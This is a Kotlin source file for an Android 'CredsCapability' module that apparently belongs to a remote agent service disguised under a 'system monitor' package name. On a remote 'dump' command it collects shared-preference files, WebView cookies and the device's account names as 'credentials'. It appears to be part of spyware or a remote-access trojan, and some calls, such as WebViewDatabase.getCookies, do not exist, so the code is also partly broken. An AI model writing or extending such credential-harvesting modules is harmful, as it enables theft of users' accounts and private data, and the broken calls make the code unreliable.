package com.system.monitor.capabilities

import android.content.Context
import android.content.SharedPreferences
import android.webkit.WebViewDatabase
import com.google.gson.Gson
import com.system.monitor.AgentService
import java.io.File

class CredsCapability(private val service: AgentService) : AgentService.Capability {

    private val gson = Gson()

    override fun execute(args: String?): Any {
        val params = gson.fromJson(args ?: "{}", Params::class.java)
        return when (params.action) {
            "dump" -> dumpCredentials()
            else -> mapOf("error" to "invalid action")
        }
    }

    override fun cleanup() {}

    private fun dumpCredentials(): Map<String, Any> {
        val creds = mutableListOf<Map<String, Any>>()
        
        // SharedPreferences
        val prefsDir = File(service.filesDir.parentFile, "shared_prefs")
        if (prefsDir.exists()) {
            prefsDir.listFiles()?.forEach { file ->
                if (file.extension == "xml") {
                    creds.add(mapOf("type" to "shared_prefs", "file" to file.name, "path" to file.absolutePath))
                }
            }
        }
        
        // WebView cookies/database
        try {
            val webViewDb = WebViewDatabase.getInstance(service)
            val cookies = webViewDb.getCookies("https://")
            creds.add(mapOf("type" to "webview_cookies", "count" to cookies?.length ?: 0))
        } catch (e: Exception) {
            // ignore
        }
        
        // Account manager - simplified
        try {
            val accounts = android.accounts.AccountManager.get(service).accounts
            val accountList = accounts.map { a -> mapOf("name" to a.name, "type" to a.type) }
            creds.add(mapOf("type" to "accounts", "accounts" to accountList))
        } catch (e: Exception) {
            // ignore
        }

        return mapOf("credentials" to creds, "count" to creds.size)
    }

    data class Params(val action: String)
}